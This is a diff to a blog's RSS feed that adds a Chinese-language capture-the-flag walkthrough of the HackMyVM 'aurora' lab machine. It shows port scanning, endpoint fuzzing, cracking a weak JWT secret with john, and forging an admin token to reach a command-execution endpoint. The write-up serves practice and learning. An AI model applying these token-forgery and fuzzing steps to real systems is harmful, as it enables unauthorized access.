@@ -1,5 +1,215 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Blog Title</title><link>https://7r1UMPH.github.io</link><description>Blog description</description><copyright>Blog Title</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Thu, 20 Mar 2025 07:53:47 +0000</lastBuildDate><managingEditor>Blog Title</managingEditor><ttl>60</ttl><webMaster>Blog Title</webMaster><item><title>hmv_Arroutada</title><link>https://7r1UMPH.github.io/post/hmv_Arroutada.html</link><description># hmv_Arroutada
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Blog Title</title><link>https://7r1UMPH.github.io</link><description>Blog description</description><copyright>Blog Title</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Thu, 20 Mar 2025 07:54:47 +0000</lastBuildDate><managingEditor>Blog Title</managingEditor><ttl>60</ttl><webMaster>Blog Title</webMaster><item><title>hmv_aurora</title><link>https://7r1UMPH.github.io/post/hmv_aurora.html</link><description># hmv_aurora
+
+# 0.简介
+
+**靶机**：[hackmyvm - aurora](https://hackmyvm.eu/machines/machine.php?vm=aurora)
+**难度**：绿色
+**目标 IP**：192.168.205.138
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 10:12 CST
+Nmap scan report for 192.168.205.138
+Host is up (0.00044s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  ppp
+MAC Address: 08:00:27:68:BD:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
+```
+
+**3000**大概率是**web**页面
+
+# 2.踩点
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/
+&lt;!DOCTYPE html&gt;
+&lt;html lang='en'&gt;
+&lt;head&gt;
+&lt;meta charset='utf-8'&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;Cannot GET /&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/
+&lt;!DOCTYPE html&gt;
+&lt;html lang='en'&gt;
+&lt;head&gt;
+&lt;meta charset='utf-8'&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;Cannot GET /&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+```
+
+禁止`GET`访问，那我们就`POST`
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u 'http://192.168.205.138:3000' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -m POST
+                                                                                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben 'epi' Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.205.138:3000
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, txt, md]
+ 🏁  HTTP methods          │ [POST]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404     POST       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+401     POST        1l        2w       22c http://192.168.205.138:3000/login
+400     POST        1l        6w       29c http://192.168.205.138:3000/register
+401     POST        1l        2w       22c http://192.168.205.138:3000/Login
+400     POST        1l        6w       29c http://192.168.205.138:3000/Register
+401     POST        1l        1w       12c http://192.168.205.138:3000/execute
+
+```
+
+使用`curl`访问
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/login -X POST
+Identifiants invalides                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/register -X POST
+The 'role' field is not valid                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/execute -X POST 
+Unauthorized                                                                                                                                    
+
+```
+
+我们注册一个用户试试
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'admin\'}'
+Not authorized !
+```
+
+啊这，丢去`WFUZZ`爆破一下
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -c -u 'http://192.168.205.138:3000/register' -X POST -H 'Content-Type: application/json' -d '{\'role\':\'FUZZ\'}' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 6
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.205.138:3000/register
+Total requests: 62284
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                             
+=====================================================================
+
+000000003:   401        0 L      3 W        16 Ch       'admin'                                                             
+000000022:   500        0 L      5 W        32 Ch       'user'                                                              
+
+Total time: 58.91045
+Processed Requests: 62284
+Filtered Requests: 62282
+Requests/sec.: 1057.265
+
+```
+
+继续注册
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\'}' 
+Column 'username' cannot be null                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\'}'
+Column 'password' cannot be null                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
+Registration OK                                                                                                                                     
+```
+
+去登录试试
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/login -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
+{'accessToken':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA'}
+```
+
+这很`jwt`，去尝试解码，[网站](https://jwt.io/)
+
+![Image](https://github.com/user-attachments/assets/c55c1345-380f-4116-911b-b55fe1655ab6)
+
+将密钥爆破一下
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA' &gt; hash
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+nopassword       (?)   
+1g 0:00:00:00 DONE (2025-01-23 10:31) 100.0g/s 4915Kp/s 4915Kc/s 4915KC/s 123456..trudy
+Use the '--show' option to display all of the cracked passwords reliably
+Session completed.
+```
+
+改一下参数
+
+![Image](https://github.com/user-attachments/assets/8c4fe2dd-1e58-4776-b407-e717b8dd3ef6)
+
+尝试一下那个`execute`
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk'
+&lt;!DOCTYPE html&gt;
+&lt;html lang='en'&gt;
+&lt;head&gt;
+&lt;meta charset='utf-8'&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;TypeError [ERR_INVALID_ARG_TYPE]: The &amp;quot;file&amp;quot; argument must be of type string. Received undefined&lt;br&gt; &amp;nbsp; &amp;nbsp;at validateString (internal/validators.js:120:11)&lt;br&gt; &amp;nbsp; &amp;nbsp;at normalizeSpawnArguments (child_process.js:411:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at spawn (child_process.js:547:16)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.execFile (child_process.js:237:17)&lt;br&gt; &amp;nbsp; &amp;nbsp;at exec (child_process.js:158:25)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:69:3&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:112:5&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+```
+
+`Authorization` 头以 `Bearer` 开头。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_aurora.html</guid><pubDate>Thu, 20 Mar 2025 07:54:19 +0000</pubDate></item><item><title>hmv_Arroutada</title><link>https://7r1UMPH.github.io/post/hmv_Arroutada.html</link><description># hmv_Arroutada
 
 # 0.简介
 
